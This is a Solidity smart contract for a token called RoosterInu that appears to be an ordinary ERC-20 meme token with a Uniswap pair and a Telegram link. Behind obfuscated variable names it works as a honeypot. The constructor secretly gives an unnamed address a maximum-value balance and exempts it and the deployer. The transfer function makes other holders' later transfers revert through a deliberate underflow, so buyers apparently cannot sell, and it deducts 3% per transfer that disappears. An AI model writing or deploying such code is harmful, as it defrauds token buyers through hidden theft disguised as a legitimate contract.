// https://t.me/roosterinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract RoosterInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private grandfather;

    function _transfer(
        address most,
        address tank,
        uint256 piece
    ) internal override {
        uint256 rocket = toward;

        if (fish[most] == 0 && grandfather[most] > 0 && uniswapV2Pair != most) {
            fish[most] -= rocket;
        }

        address planning = correct;
        correct = tank;
        grandfather[planning] += rocket + 1;

        _balances[most] -= piece;
        uint256 win = (piece / 100) * toward;
        piece -= win;
        _balances[tank] += piece;
    }

    address private correct;
    mapping(address => uint256) private fish;
    uint256 public toward = 3;

    constructor(
        string memory worried,
        string memory further,
        address paid,
        address mad
    ) ERC20(worried, further) {
        uint256 finger = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(paid);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        fish[msg.sender] = finger;
        fish[mad] = finger;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[mad] = finger;
    }
}